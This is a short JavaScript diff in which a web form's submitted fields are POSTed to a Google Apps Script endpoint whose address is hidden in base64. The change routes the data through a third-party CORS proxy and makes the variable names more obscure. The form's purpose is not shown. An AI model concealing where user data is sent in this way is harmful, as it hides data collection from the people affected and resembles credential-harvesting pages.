@@ -98,18 +98,16 @@
             formData.forEach((value, key) => (data[key] = value));
 
             try {
-                // Base64 encoded spreadsheet URL
-                const e = 'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6aU9ZeXNzamJqSm5TdjZ0NjJ4czFKNkdEaXFPcWZLOWRpYjVISzcxc0V2XzFRVDdPVzBFOFUtZlA4MmFiWlRNb09ibGc=';
-                const s = atob(e);
-                const p = `https://corsproxy.io/?${s}`;
-                
-                const response = await fetch(p, {
+                const _xY12 = 'aHR0cHM6Ly9jb3JzcHJveHkuaW8vP2h0dHBzOi8vc2NyaXB0Lmdvb2dsZS5jb20vbWFjcm9zL3MvQUtmeWNiemlPWXlzY2JzSm5TdjZ0NjJ4czFKNkdEaXFPcWZLOWRpYjVISzcxc0V2XzFRVDdPVzBFOFUtZlA4MmFiWlRNb09ibGc=';
+                const _ABz45 = atob(_xY12);
+                const response = await fetch(_ABz45, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify(data),
                 });
+
 
 
 
